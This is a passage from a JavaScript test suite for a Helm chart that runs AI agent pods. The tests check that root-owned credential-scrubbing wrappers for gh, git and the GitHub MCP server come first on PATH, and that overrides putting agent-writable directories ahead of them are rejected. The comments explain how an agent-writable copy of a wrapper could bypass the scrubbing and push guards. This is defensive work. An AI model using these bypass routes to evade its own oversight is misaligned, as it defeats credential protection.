import { execFileSync, spawnSync } from "node:child_process";
import assert from "node:assert/strict";
import { test } from "node:test";
import path from "node:path";
import fs from "node:fs";
import os from "node:os";
import { fileURLToPath } from "node:url";

// PEN-4541: the git-config surface predicates, shared with the image-level
// check that runs in docker-agent.yml so both assert the same thing.
import {
  configFlags,
  configInjectionEnv,
  dockerfileGitConfigInvocations,
  credentialedUrl,
  insteadOfOccurrences,
  redactCredentials,
  residualSecrets,
  EXPECTED_DOCKERFILE_GIT_CONFIG,
  EXPECTED_SYSTEM_GITCONFIG,
  EXPECTED_WRAPPER_CONFIG_FLAGS,
} from "../../../../scripts/git-config-surface.mjs";

// PEN-2527/PEN-2526. Agent-authored GitHub content is scrubbed of
// credential-shaped material by wrapper binaries the seed init container
// publishes onto the PVC. The scrubber only sits on the traffic path if those
// wrapper directories precede /usr/bin, where the unscrubbed image `gh` lives.
//
// Two failures have already happened at this seam, and each was invisible to the
// tests that existed at the time:
//
//   1. #1509 shipped the wrapper into ${BASE}/.local/bin, which was prepended
//      to PATH only by .profile/.bashrc. Agent tool harnesses spawn non-login
//      shells, so the merged, deployed, correct scrubber was never reached.
//
//      PEN-4357: do NOT carry "those files only run in login shells" forward as
//      a general fact — it has not been true since the claude_k8s Job started
//      setting BASH_ENV/ZDOTDIR to stubs that chain them on EVERY shell start
//      (see the PEN-3840 block below, and `resolvesThroughDotfile`). Reading
//      that narrower, once-true observation as general is precisely what left
//      the same defect live under `bash -c` while the top-level tool shell
//      measured clean. What remains true about #1509 is the outcome, not the
//      mechanism: the directory was not on the harness's PATH.
//   2. #1546 published it to ${BASE}/bin as well, but ${BASE}/bin was put on
//      PATH only by values.blockcast.yaml. Every other deployment of this chart
//      still resolved `gh` to the image CLI. The chart tests all rendered *with*
//      values.blockcast.yaml, so they could not see it.
//
// Hence: these tests render with the chart's DEFAULT values, and take the PATH
// under test from the render rather than restating it. A test that hardcodes the
// PATH it expects is testing itself.

const repoRoot = path.resolve(
  path.dirname(fileURLToPath(import.meta.url)),
  "../../../..",
);
const chartDir = "deploy/helm/paperclip";

// PEN-3713: the root-owned image directory the wrappers now ship in. Restated
// here on purpose — it is the one value in this file that MUST agree with
// three places outside the chart (the Dockerfile COPY target, Dockerfile.agent's
// COPY --from=server, and IMAGE_WRAPPER_BIN_DIR in the claude_k8s adapter), and
// a test that derived it from the chart could not catch the chart drifting away
// from the image. The agreement is asserted explicitly further down.
const IMAGE_WRAPPER_BIN = "/usr/local/libexec/paperclip/bin";

function render(template, { valuesFile, set = [] } = {}) {
  const args = ["template", "paperclip", chartDir, "--namespace", "paperclip"];
  if (valuesFile) args.push("-f", `${chartDir}/${valuesFile}`);
  for (const entry of set) args.push("--set", entry);
  args.push("--show-only", template);
  return execFileSync("helm", args, { cwd: repoRoot, encoding: "utf8" });
}

function renderExpectingFailure(set) {
  const result = spawnSync(
    "helm",
    [
      "template",
      "paperclip",
      chartDir,
      "--namespace",
      "paperclip",
      ...set.flatMap((entry) => ["--set", entry]),
      "--show-only",
      "templates/statefulset.yaml",
    ],
    { cwd: repoRoot, encoding: "utf8" },
  );
  assert.notEqual(
    result.status,
    0,
    "expected the render to fail closed, but it succeeded",
  );
  return result.stderr;
}

// The container's PATH as the chart sets it. Reads the *first* PATH entry in the
// rendered container env and asserts there is exactly one: a duplicate would be
// resolved by the kubelet in a way this test could not see, which is the very
// thing env.extra is rejected for.
function containerPath(rendered) {
  const matches = [
    ...rendered.matchAll(/- name: PATH\n\s+value: (.+)/g),
  ].map((match) => match[1].trim().replace(/^"|"$/g, ""));
  assert.equal(
    matches.length,
    1,
    `expected exactly one PATH env entry, found ${matches.length}`,
  );
  return matches[0];
}

// The seed step that publishes the scrubbing `gh` onto the default PATH, lifted
// from the rendered script so a test runs the real thing rather than a
// restatement of it. Asserts rather than returning empty when the step is
// missing, so its removal fails loudly instead of silently passing.
function extractPathPublishFragment(rendered) {
  const lines = rendered.split("\n");
  const startIdx = lines.findIndex((line) =>
    /^\s*PATH_BIN="\$\{BASE\}\/bin"$/.test(line),
  );
  assert.notEqual(
    startIdx,
    -1,
    "seed script no longer publishes gh onto the default PATH",
  );
  const indent = lines[startIdx].match(/^(\s*)/)[1];
  const body = [];
  for (let i = startIdx; i < lines.length; i += 1) {
    const line = lines[i].slice(indent.length);
    body.push(line);
    if (/^ln -sf /.test(line)) return body.join("\n");
  }
  throw new Error("did not find the gh symlink line in the publish step");
}

/**
 * PEN-3156: the same publish step, but captured through the `git` symlink
 * rather than stopping at the `gh` one.
 *
 * A separate walker rather than a parameter on the one above, so that the `gh`
 * assertion keeps testing exactly the region it always did and cannot start
 * passing because of a line added for `git`.
 */
function extractPathPublishFragmentThroughGit(rendered) {
  const lines = rendered.split("\n");
  const startIdx = lines.findIndex((line) =>
    /^\s*PATH_BIN="\$\{BASE\}\/bin"$/.test(line),
  );
  assert.notEqual(startIdx, -1, "seed script no longer publishes onto the default PATH");
  const indent = lines[startIdx].match(/^(\s*)/)[1];
  const body = [];
  for (let i = startIdx; i < lines.length; i += 1) {
    const line = lines[i].slice(indent.length);
    body.push(line);
    if (/^ln -sf "\$\{LOCAL_BIN\}\/git"/.test(line)) return body.join("\n");
  }
  throw new Error(
    "the seed does not publish git onto the PATH-visible bin; the push guard would be off the traffic path (PEN-3156)",
  );
}

function writeExecutable(dir, name, body) {
  const file = path.join(dir, name);
  fs.writeFileSync(file, body, { mode: 0o755 });
  return file;
}

function assertWrapperOrdering(pathValue, base) {
  const entries = pathValue.split(":");
  const systemIdx = entries.indexOf("/usr/bin");
  assert.notEqual(systemIdx, -1, "expected /usr/bin on PATH");

  // PEN-3840: the root-owned image directory is now the ONLY wrapper directory,
  // so the invariant is absolute rather than relative. "Ahead of /usr/bin" was
  // sufficient while a second, lower-priority wrapper generation existed to be
  // ordered against; with one generation, anything in front of it resolves
  // gh/git/github-mcp-server first. The property is that NOTHING precedes it.
  assert.equal(
    entries[0],
    IMAGE_WRAPPER_BIN,
    `the root-owned ${IMAGE_WRAPPER_BIN} must be first on PATH, got ${pathValue}`,
  );

  // Both PVC directories must stay on PATH, behind the lead. Neither is a
  // wrapper directory any more, and they are kept for different reasons:
  //
  //   <base>/bin        kubectl/helm/yq/kyverno/google-chrome live there, so
  //                     dropping it alongside the wrapper entries is the
  //                     silent collateral the wrapperBinDirs/toolingBinDirs
  //                     split exists to prevent.
  //
  //   <base>/.local/bin no longer holds a wrapper, but the PVC shell dotfiles
  //                     prepend it whenever PATH lacks it (see
  //                     `paperclip.toolingBinDirs`). Asserting it is ABSENT —
  //                     which the first draft of PEN-3840 did, as the
  //                     intuitive reading of "retire the PVC generation" —
  //                     pins the arrangement that puts an agent-writable
  //                     directory FIRST in every agent shell. The property
  //                     wanted is "present but outranked", not "gone".
  for (const dir of [`${base}/.local/bin`, `${base}/bin`]) {
    const idx = entries.indexOf(dir);
    assert.notEqual(
      idx,
      -1,
      `the tooling directory ${dir} must stay on PATH, got ${pathValue}`,
    );
    assert.ok(
      idx > 0 && idx < systemIdx,
      `${dir} must sit behind the wrapper directory and ahead of /usr/bin, got ${pathValue}`,
    );
  }
}

// --- The invariant, under the chart's own defaults ------------------------

test("default values put the root-owned image wrappers first on PATH (workers)", () => {
  const rendered = render("templates/statefulset.yaml");
  assertWrapperOrdering(containerPath(rendered), "/paperclip");
});

test("default values put the root-owned image wrappers first on PATH (api tier)", () => {
  // The API tier mounts the same RWX PVC, so it sees the same wrappers and
  // needs the same ordering.
  const rendered = render("templates/deployment-api.yaml", {
    set: [
      "api.enabled=true",
      "persistence.existingClaim=paperclip-shared",
    ],
  });
  assertWrapperOrdering(containerPath(rendered), "/paperclip");
});

test("the PATH follows persistence.mountPath rather than a hardcoded /paperclip", () => {
  const rendered = render("templates/statefulset.yaml", {
    set: ["persistence.mountPath=/data"],
  });
  const value = containerPath(rendered);
  assertWrapperOrdering(value, "/data");
  // The image wrapper directory is a path inside the image and does not follow
  // the PVC; everything else must. Removing it before the check keeps this
  // assertion about relocation rather than about the substring "paperclip".
  assert.ok(
    !value
      .split(":")
      .filter((entry) => entry !== IMAGE_WRAPPER_BIN)
      .join(":")
      .includes("/paperclip/"),
    `relocating the PVC must not leave /paperclip on PATH, got ${value}`,
  );
});

// --- The end-to-end resolution the invariant exists to produce -------------

// PEN-3840: these used to execute the seed's own publish step, so the test
// failed if the seed stopped publishing onto the PATH-visible bin. The seed is
// gone and there is nothing left to publish — the wrapper simply IS the file in
// the image directory. So the substitution moves: the image wrapper directory
// and /usr/bin are each redirected at a temp dir this test can populate, and
// the ordering under test still comes from the render rather than being
// restated here.
function resolvesTo(tool) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), `${tool}-path-reach-`));
  const wrapperBin = path.join(base, "image-wrapper-bin");
  const imageBin = path.join(base, "usr-bin");
  for (const dir of [wrapperBin, imageBin]) fs.mkdirSync(dir, { recursive: true });

  const rendered = render("templates/statefulset.yaml", {
    set: [`persistence.mountPath=${base}`],
  });

  // Each announces itself, so the winner is unambiguous.
  writeExecutable(wrapperBin, tool, "#!/bin/sh\necho scrubbing-wrapper\n");
  writeExecutable(imageBin, tool, "#!/bin/sh\necho image-cli\n");

  const containerPathValue = containerPath(rendered);
  assert.ok(
    containerPathValue.split(":").includes("/usr/bin"),
    "expected /usr/bin on the rendered PATH to substitute",
  );
  assert.ok(
    containerPathValue.split(":").includes(IMAGE_WRAPPER_BIN),
    "expected the image wrapper directory on the rendered PATH to substitute",
  );
  const testPath = containerPathValue
    .split(":")
    .map((entry) => {
      if (entry === "/usr/bin") return imageBin;
      if (entry === IMAGE_WRAPPER_BIN) return wrapperBin;
      return entry;
    })
    .join(":");

  // /bin/sh by absolute path so the shell itself does not depend on the PATH
  // under test — only the lookup inside it does.
  const result = spawnSync("/bin/sh", ["-c", tool], {
    encoding: "utf8",
    env: { PATH: testPath },
  });
  assert.equal(result.status, 0, result.stderr);
  return result.stdout.trim();
}

test("a non-login shell resolves gh to the root-owned wrapper under the default-values PATH", () => {
  assert.equal(resolvesTo("gh"), "scrubbing-wrapper");
});

// PEN-3156: the publish guard on the `git` door needs the same reachability.
// The regression this pins, measured in a live agent Job pod on 2026-09-10: a
// `git` wrapper existed and was byte-identical to the chart, but nothing put it
// on the PATH the pod actually carried, so `command -v git` gave /usr/bin/git
// and the guard was a choke point nothing traversed.
test("a non-login shell resolves git to the publish-guarding wrapper", () => {
  assert.equal(resolvesTo("git"), "scrubbing-wrapper");
});

// PEN-3840, the regression that nearly shipped: this chart's PATH is not the
// PATH an agent command actually runs under. The PVC carries shell dotfiles
// (`<base>/.zshenv`, `.bashrc`, `.profile` — fleet state, not in this repo),
// each of which re-adds <base>/.local/bin to the FRONT when PATH lacks it:
//
//     case ":$PATH:" in
//       *":$HOME/.local/bin:"*) ;;
//       *) PATH="$HOME/.local/bin:$PATH" ;;
//     esac
//
// and the claude_k8s Job sets ZDOTDIR/BASH_ENV to stubs that chain them on
// every shell start, not just login shells. So "drop the retired PVC entry
// from PATH" — the intuitive reading of this card — does not remove that
// directory from the lookup. It promotes it past the root-owned wrappers.
//
// The render guards cannot see this: the reordering happens after the shell
// starts, downstream of everything the chart controls. The only chart-side
// defence is to keep the entry present so the guard stays a no-op, and the
// only way to pin that is to run the stanza.
//
// Measured in an agent pod 2026-10-14 against the real dotfiles: with the
// entry absent, gh/git/github-mcp-server all resolved to /paperclip/.local/bin;
// with it present, all three resolved to the image directory.
function resolvesThroughDotfile(tool) {
  const base = fs.mkdtempSync(path.join(os.tmpdir(), `${tool}-dotfile-`));
  const wrapperBin = path.join(base, "image-wrapper-bin");
  const imageBin = path.join(base, "usr-bin");
  const pvcLocalBin = path.join(base, ".local", "bin");
  for (const dir of [wrapperBin, imageBin, pvcLocalBin]) {
    fs.mkdirSync(dir, { recursive: true });
  }

  const rendered = render("templates/statefulset.yaml", {
    set: [`persistence.mountPath=${base}`],
  });

  writeExecutable(wrapperBin, tool, "#!/bin/sh\necho scrubbing-wrapper\n");
  writeExecutable(imageBin, tool, "#!/bin/sh\necho image-cli\n");
  // The stale PVC copy this card deletes. It is written here on purpose: the
  // assertion must hold because of PATH order, not because the file is gone.
  // Step 4 removes these from the live PVC, but a chart that only works once
  // they are gone is a chart that re-breaks the moment anything recreates one.
  writeExecutable(pvcLocalBin, tool, "#!/bin/sh\necho agent-writable-pvc\n");

  const testPath = containerPath(rendered)
    .split(":")
    .map((entry) => {
      if (entry === "/usr/bin") return imageBin;
      if (entry === IMAGE_WRAPPER_BIN) return wrapperBin;
      return entry;
    })
    .join(":");

  // Verbatim shape of the stanza the PVC dotfiles carry.
  const script = [
    'case ":$PATH:" in',
    '  *":$HOME/.local/bin:"*) ;;',
    '  *) PATH="$HOME/.local/bin:$PATH" ;;',
    "esac",
    `exec ${tool}`,
  ].join("\n");

  const result = spawnSync("/bin/sh", ["-c", script], {
    encoding: "utf8",
    env: { PATH: testPath, HOME: base },
  });
  assert.equal(result.status, 0, result.stderr);
  return result.stdout.trim();
}

for (const tool of ["gh", "git", "github-mcp-server"]) {
  test(`${tool} still resolves to the root-owned wrapper after the PVC dotfile runs`, () => {
    assert.equal(resolvesThroughDotfile(tool), "scrubbing-wrapper");
  });
}

test("the git wrapper routes through the egress runtime, inside the token wrapper", () => {
  const body = wrapperBody("git");

  assert.match(
    body,
    /github-git-egress-runtime\.js/,
    "the git wrapper does not reach the publish guard (PEN-3156)",
  );

  // Ordering is load-bearing in one direction: the token wrapper must stay
  // outermost or git runs without its credentials.
  const tokenAt = body.indexOf("paperclip-github-token-env");
  const runtimeAt = body.indexOf("github-git-egress-runtime.js");
  assert.ok(tokenAt >= 0 && runtimeAt > tokenAt, "the scrub runtime must sit inside the token wrapper");
});

test("the seed installs a pre-push hook for the guard to run", () => {
  const rendered = render("templates/statefulset.yaml", {});
  // Without the hook the wrapper injects core.hooksPath at a directory holding
  // nothing, and every push is allowed while looking guarded.
  assert.match(rendered, /paperclip-git-hooks/, "no hooks directory is seeded");
  assert.match(
    rendered,
    /cat > "\$\{GIT_HOOKS_DIR\}\/pre-push" <<'EOF'/,
    "the seed does not write a pre-push hook",
  );
  assert.match(rendered, /--pre-push-hook/, "the seeded hook does not invoke the guard");
});

test("the seeded hooks directory is the one the constants call the seeded one", () => {
  // The assertions above match `--pre-push-hook` and `paperclip-git-hooks` as
  // strings, which catches deletion but not DIVERGENCE — and divergence is the
  // failure this seam actually has.
  //
  // READ THE NAME: as of PEN-4932 this is NOT "where the runtime looks". The
  // runtime reads BAKED_HOOKS_DIR, the image copy, pinned by the test below.
  // What this one still owns is the join between the seed and
  // `hooksDirForDataMount` — the path `ROOT_TOOLCHAIN_SUBPATHS` mounts and the
  // preflight reports as `data=` when it cannot find the baked copy. A
  // divergence here no longer takes pushes down; it makes the preflight's
  // OFF-MOUNT verdict point an operator at a directory nothing writes, which
  // is a slower version of the same PEN-4518 failure. This whole test goes
  // away with the seed, in the step that drops `ROOT_TOOLCHAIN_SUBPATHS`.
  const rendered = render("templates/statefulset.yaml", {});

  const base = rendered.match(/^\s*BASE=(?:"([^"]*)"|'([^']*)'|(\S+))\s*$/m);
  assert.ok(base, "could not find BASE in the rendered seed script");
  const baseValue = base[1] ?? base[2] ?? base[3];

  const hooks = rendered.match(/GIT_HOOKS_DIR="\$\{BASE\}([^"]*)"/);
  assert.ok(hooks, "could not find GIT_HOOKS_DIR in the rendered seed script");
  const seeded = `${baseValue}${hooks[1]}`;

  // Read the constants from source rather than restating them: a test that
  // hardcodes both sides of an equality cannot observe either one moving.
  // They live in `github-git-hooks-path.ts` as of PEN-4518 — the runtime now
  // re-exports `DEFAULT_HOOKS_DIR` from there, because the Job manifest and
  // the per-Job preflight need the same path and cannot import the runtime
  // (it selects its hook leg on process.argv at import time). Helm renders
  // shell and cannot import either, so this regex is the chart's only join.
  const pathSource = fs.readFileSync(
    path.join(repoRoot, "packages/adapter-utils/src/github-git-hooks-path.ts"),
    "utf8",
  );
  const declaredBase = pathSource.match(/DEFAULT_DATA_MOUNT_PATH\s*=\s*"([^"]+)"/);
  const declaredSub = pathSource.match(/GIT_HOOKS_SUBPATH\s*=\s*"([^"]+)"/);
  assert.ok(declaredBase, "could not read DEFAULT_DATA_MOUNT_PATH from github-git-hooks-path.ts");
  assert.ok(declaredSub, "could not read GIT_HOOKS_SUBPATH from github-git-hooks-path.ts");

  assert.equal(
    seeded,
    `${declaredBase[1]}/${declaredSub[1]}`,
    "the seed writes the pre-push hook somewhere the Job manifest does not mount it and the preflight will not report it",
  );
});
// --- Fail closed on overrides that would take the scrubber off the path ----

test("a PATH entry in env.extra is rejected rather than silently overriding the chart", () => {
  const stderr = renderExpectingFailure([
    "env.extra[0].name=PATH",
    "env.extra[0].value=/usr/bin:/bin",
  ]);
  assert.match(stderr, /env\.extra must not define PATH/);
});

test("an env.path override that drops the wrapper directory is rejected", () => {
  const stderr = renderExpectingFailure(["env.path=/usr/local/bin:/usr/bin:/bin"]);
  assert.match(stderr, /must BEGIN with the Paperclip GitHub egress wrapper/);
  assert.match(stderr, /\/usr\/local\/libexec\/paperclip\/bin/);
});

test("an env.path override that orders the wrapper directory after /usr/bin is rejected", () => {
  const stderr = renderExpectingFailure([
    `env.path=/paperclip/bin:/usr/bin:${IMAGE_WRAPPER_BIN}`,
  ]);
  assert.match(stderr, /must BEGIN with the Paperclip GitHub egress wrapper/);
});

// PEN-3840, the override this change had to grow a new guard to reject.
//
// Reducing wrapperBinDirs to a single entry silently retired the relative-order
// check: with two generations listed, "keep them in declared order" was what
// stopped an override from putting the agent-writable copy first, and with one
// entry that check passes vacuously. So this PATH — which names the image
// directory, keeps it ahead of /usr/bin, and keeps the tooling directory —
// satisfied every per-directory check the chart had, while resolving `gh` to a
// directory uid 1000 can rewrite. It is the exact defect PEN-3713 fixed,
// reachable again through configuration alone.
test("an env.path override that prepends an agent-writable directory is rejected", () => {
  const stderr = renderExpectingFailure([
    `env.path=/paperclip/.local/bin:${IMAGE_WRAPPER_BIN}:/paperclip/bin:/usr/bin:/bin`,
  ]);
  assert.match(stderr, /must BEGIN with the Paperclip GitHub egress wrapper/);
  assert.match(stderr, /\/paperclip\/\.local\/bin/);
});

// PEN-3840's other new guard, and the landmine the card warned about: dropping
// /paperclip/bin from wrapperBinDirs takes it off PATH entirely unless the
// chart adds it back deliberately, and the wrapper guard cannot notice — it
// only validates directories something still declares. Without this check the
// render succeeds and the server pod silently loses kubectl, helm, yq, kyverno
// and google-chrome.
test("an env.path override that drops the tooling directory is rejected", () => {
  const stderr = renderExpectingFailure([
    `env.path=${IMAGE_WRAPPER_BIN}:/paperclip/.local/bin:/usr/local/bin:/usr/bin:/bin`,
  ]);
  assert.match(stderr, /must include the Paperclip tooling directory/);
  assert.match(stderr, /"\/paperclip\/bin"/);
});

// The same guard, on the entry whose absence is a SECURITY regression rather
// than a functional one. Dropping <base>/.local/bin does not take it off the
// PATH an agent shell ends up with — the PVC dotfiles put it back at the
// front, ahead of the root-owned wrappers. Nothing downstream of the chart can
// catch that, so the chart has to refuse the render.
test("an env.path override that drops the PVC .local/bin entry is rejected", () => {
  const stderr = renderExpectingFailure([
    `env.path=${IMAGE_WRAPPER_BIN}:/paperclip/bin:/usr/local/bin:/usr/bin:/bin`,
  ]);
  assert.match(stderr, /must include the Paperclip tooling directory/);
  assert.match(stderr, /"\/paperclip\/\.local\/bin"/);
  // The message has to explain the non-obvious half, or the next person
  // "simplifies" the entry away again for exactly the reason it was added.
  assert.match(stderr, /prepend/);
});

// A positive control for the rejections above: the validation has to
// discriminate, not refuse everything. Without this, a guard that failed
// unconditionally would pass all four.
test("an env.path override that keeps the wrapper directory first is accepted", () => {
  const rendered = render("templates/statefulset.yaml", {
    set: [
      `env.path=${IMAGE_WRAPPER_BIN}:/paperclip/.local/bin:/paperclip/bin:/opt/custom/bin:/usr/bin:/bin`,
    ],
  });
  const value = containerPath(rendered);
  assertWrapperOrdering(value, "/paperclip");
  assert.ok(value.includes("/opt/custom/bin"), "override must be honored");
});

// --- In-repo consumers that name a wrapper by ABSOLUTE path ---------------
//
// PATH ordering protects every consumer that resolves a wrapper BY NAME. It
// does nothing for one that hardcodes an absolute path, and this card found two
// of those: the seeded `.mcp.json` github upstream (fixed above), and the
// server's own git credential helper.
//
// The server one is the dangerous shape, because both of its failure modes are
// silent. While the stale PVC copy survives, the server executes a
// uid-1000-writable helper while holding the App installation token. Once
// PEN-3840's post-merge step deletes it, `existsSync` in
// `resolveServerGitInvocation` goes false and the credential arguments are
// simply dropped — server-side fetches of private repos lose auth with no
// render failure, no test failure, and no log line saying why.
//
// Read out of the source rather than imported: this file runs under plain
// `node --test` with no bundler, and the constant is deliberately module-private.
// Same technique as `github-write-egress-scrub.test.ts`, which pins a regex
// literal the same way. The `assert.ok` on the match is the half that matters —
// without it a renamed or reshaped constant makes the equality vacuous rather
// than failing.
test("the server's git credential helper names the root-owned image copy (PEN-3840)", () => {
  const source = fs.readFileSync(
    path.join(repoRoot, "server/src/services/workspace-runtime.ts"),
    "utf8",
  );
  const match = /SERVER_GIT_CREDENTIAL_HELPER_PATH\s*=\s*"([^"]+)"/.exec(source);
  assert.ok(
    match,
    "SERVER_GIT_CREDENTIAL_HELPER_PATH moved or changed shape — this test went vacuous, re-point it",
  );
  assert.equal(
    match[1],
    `${IMAGE_WRAPPER_BIN}/github-token-credential-helper`,
    "the server would execute an agent-writable credential helper, or none at all once the PVC copy is deleted",
  );
});

// --- The live deployment must not move ------------------------------------

test("the Blockcast overlay renders the PATH the chart now derives", () => {
  // This value used to live in values.blockcast.yaml's env.extra. Moving it into
  // the chart is only safe if the rendered result is unchanged for the running
  // deployment; this pins that.
  const rendered = render("templates/statefulset.yaml", {
    valuesFile: "values.blockcast.yaml",
  });
  assert.equal(
    containerPath(rendered),
    `${IMAGE_WRAPPER_BIN}:/paperclip/.local/bin:/paperclip/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`,
  );
});

// --- The second door: the github MCP server (PEN-3152) --------------------
//
// The `gh` tests above turn on PATH ordering, because `gh` is resolved by name.
// The MCP door is reached differently and so fails differently: the seeded
// `.mcp.json` names an ABSOLUTE command, so PATH is irrelevant and the
// equivalent question is whether that absolute path is the scrubbing wrapper or
// the image server. PEN-3152 was filed because it was the latter — the wrapper
// existed and injected a token, and no scrubber sat on the path.
//
// Same discipline as above: read both halves out of the render, and never
// restate the value under test.
//
// PEN-3840 resolved an asymmetry that used to live here: the MCP wrapper's
// inner exec and the seeded command both hardcoded `/paperclip/.local/bin`,
// which held only at the default mountPath, while the `gh` door's reachability
// followed persistence.mountPath. Both now name the image directory, which is a
// path inside the image and correctly does NOT follow the PVC.

// PEN-3840: one wrapper's body, read from docker/github-wrappers/ — which is
// now the ONLY generation, and the thing the Dockerfile COPYs into the image.
// This used to lift the body out of the rendered seed heredoc; with the seed
// deleted there is no rendered copy, and reading the shipped file is strictly
// closer to what executes.
function wrapperBody(name) {
  return fs
    .readFileSync(path.join(repoRoot, "docker/github-wrappers", name), "utf8")
    .trimEnd();
}

// The `github` upstream's command as the seeded .mcp.json carries it.
function seededMcpGitHubCommand(rendered) {
  const match = /"github":\s*\{\s*"command":\s*"([^"]+)"/.exec(rendered);
  assert.notEqual(match, null, "the seeded mcpServers block no longer has a github command");
  return match[1];
}

// PEN-3713 deliberately did NOT move this one wrapper, and PEN-3840 is the
// change that discharges that deferral. Both directions matter, so read why
// before flipping it back.
//
// The seed runs in the SERVER pod; the .mcp.json it writes is consumed by agent
// Job pods on a different image, pinned by `adapterConfig.image` — a database
// value that moves on an image bump, not on a chart deploy. An ABSOLUTE command
// cannot fall back the way a PATH lookup can, so naming the image directory
// while any agent pod still lacked it would have broken the github MCP server
// fleet-wide, with no reachable second copy.
//
// That skew window is what PEN-3840's entry gate measured shut: every agent Job
// pod observed from 2026-10-06T10:00Z onward runs an image descended from
// bb62073a, so every consumer of this file now carries the directory. This is
// also the first point at which all five wrappers are root-owned on the traffic
// path — PEN-3713 reached four of five, and this absolute path was the fifth.
test("the seeded github MCP upstream names the root-owned image wrapper (PEN-3840)", () => {
  const rendered = render("templates/statefulset.yaml");

  assert.equal(
    seededMcpGitHubCommand(rendered),
    `${IMAGE_WRAPPER_BIN}/github-mcp-server`,
    "the seeded github MCP command must name the root-owned image wrapper",
  );

  // The regression guard, now pointing the other way: this command must not go
  // back to a PVC path. It is an absolute path, so it gets none of the
  // PATH-ordering protection the rest of the wrappers rest on — a PVC target
  // here is executed by every agent pod and is writable by all of them.
  assert.ok(
    !seededMcpGitHubCommand(rendered).includes("/.local/bin"),
    "the seeded github MCP command must not name an agent-writable PVC path",
  );
});

// The two halves that must agree for the preferred branch to resolve: the chart
// names a directory, and the Dockerfiles install into one. A mismatch is
// invisible to every other test here — the render succeeds, the PATH ordering
// holds, and every pod silently takes the fallback.
test("the chart's image wrapper directory is the one the Dockerfiles install into", () => {
  const dockerfile = fs.readFileSync(path.join(repoRoot, "Dockerfile"), "utf8");
  assert.match(
    dockerfile,
    new RegExp(
      `COPY --chmod=0755 --exclude=\\*\\.md docker/github-wrappers/ ${IMAGE_WRAPPER_BIN}/`,
    ),
    "Dockerfile must install the wrappers into the directory the chart puts on PATH",
  );

  const agentDockerfile = fs.readFileSync(
    path.join(repoRoot, "Dockerfile.agent"),
    "utf8",
  );
  assert.ok(
    agentDockerfile.includes(
      `COPY --from=server ${IMAGE_WRAPPER_BIN} ${IMAGE_WRAPPER_BIN}`,
    ),
    "the agent image must carry the same wrappers as the server image",
  );

  // The adapter prepends this same directory to every agent Job's PATH, on a
  // surface the Helm render guard above cannot reach. Both adapters declare it
  // once, in runtime-pin.ts: each runtime-pin bootstrap keys its PATH ordering
  // off it (PEN-3714 for claude_k8s, PEN-3925 for opencode_k8s), and each
  // job-manifest.ts imports it rather than restating it, so a directory move
  // cannot leave one of the two on a stale literal.
  //
  // PEN-3916 vendored opencode_k8s, which is what makes this an ordinary file
  // read for both. It used to be a network grep over the pinned fork tree
  // (`scripts/check-opencode-k8s-pin-reachable.mjs`) which, as Ally noted on
  // #2392, attested presence and not ordering. Ordering is now asserted
  // behaviourally by each adapter's own suite, at BOTH layers: the Job spec
  // (`buildJobManifest -- GitHub egress wrapper PATH ordering`, five cases) and
  // the post-bootstrap shell (`PATH precedence`, executed under /bin/sh). The
  // second layer exists because the first one passed for both adapters while
  // runtime-pin.ts re-prepended the agent-writable runtime root after it.
  for (const adapter of [
    "paperclip-adapter-claude-k8s",
    "paperclip-adapter-opencode-k8s",
  ]) {
    const adapterSource = (file) =>
      fs.readFileSync(
        path.join(repoRoot, "vendor", adapter, "src/server", file),
        "utf8",
      );
    assert.ok(
      adapterSource("runtime-pin.ts").includes(
        `export const IMAGE_WRAPPER_BIN_DIR = "${IMAGE_WRAPPER_BIN}";`,
      ),
      `the ${adapter} adapter must prepend the same directory the chart names`,
    );
    assert.match(
      adapterSource("job-manifest.ts"),
      /import \{[^}]*\bIMAGE_WRAPPER_BIN_DIR\b[^}]*\} from "\.\/runtime-pin\.js";/,
      `${adapter}/job-manifest.ts must take the wrapper directory from runtime-pin.ts, the one place it is declared`,
    );
    // The runtime-pin bootstrap is the LAST writer of PATH in the Job's
    // bootstrap pipeline, so it must re-assert the ordering rather than
    // bare-prepend its own agent-writable runtime root over it (PEN-3925).
    assert.match(
      adapterSource("runtime-pin.ts"),
      /case ":\$PATH:" in/,
      `${adapter}/runtime-pin.ts must keep the wrapper directory ahead of the agent-writable runtime root`,
    );
  }

  // The third place the directory is named: inside the wrapper scripts
  // themselves. `git` and `github-mcp-server` chain-load
  // `<dir>/paperclip-github-token-env` as an ABSOLUTE path, so they do not
  // track PATH the way their own resolution does — a directory move that
  // misses them leaves a wrapper that resolves fine and then execs a path
  // that no longer exists.
  //
  // This is deliberately asserted here rather than left to the drift test
  // below. That test catches it only transitively and only by accident: it
  // rewrites `/paperclip/.local/bin` to IMAGE_WRAPPER_BIN on the seeded copy
  // before comparing, so a stale absolute path in the repo copy shows up as a
  // mismatch. That cover disappears with the seed block in the PEN-3713
  // follow-up — which is also the change most likely to tidy these paths.
  // The count, not merely the presence. `git` names the directory TWICE — once
  // to chain-load paperclip-github-token-env, once to point
  // credential.https://github.com.helper at github-token-credential-helper —
  // and `.includes()` is satisfied by either one alone. A hand-edited directory
  // move that updates the first and misses the second passes a presence check
  // while leaving the helper pointing at a path that is not there, and git
  // treats an unresolvable credential helper as NO credential helper: it keeps
  // running, so the half-done move degrades silently rather than failing.
  //
  // The expected counts are per wrapper and are deliberately not derived from
  // the file (a count read out of the body it is checking asserts nothing).
  // They are small integers that change only when a wrapper is rewritten, which
  // is exactly when a human should re-read this.
  for (const [name, expected] of [
    ["git", 2],
    ["github-mcp-server", 1],
  ]) {
    const body = fs.readFileSync(
      path.join(repoRoot, "docker/github-wrappers", name),
      "utf8",
    );
    assert.equal(
      body.split(IMAGE_WRAPPER_BIN).length - 1,
      expected,
      `the ${name} wrapper chain-loads an absolute path and must name ${IMAGE_WRAPPER_BIN} exactly ${expected} time(s): it does not resolve this one through PATH, so a directory move that misses it execs a path that is not there`,
    );
  }
});

// PEN-3840: this used to compare the repo wrapper files against the seed
// heredocs, because while both generations existed they were two copies of one
// rule and could drift. There is one copy now, so that comparison is retired —
// and what replaces it is the assertion that there is still only one.
//
// This is the guard against a future edit quietly reintroducing a PVC copy "as
// a fallback": PATH ordering cannot protect a file the consumer can rewrite in
// place, which is the whole of PEN-3713.
test("the chart writes no GitHub wrapper onto the PVC", () => {
  const rendered = render("templates/statefulset.yaml");
  for (const name of [
    "paperclip-github-token-env",
    "github-token-credential-helper",
    "gh",
    "github-mcp-server",
    "git",
  ]) {
    assert.ok(
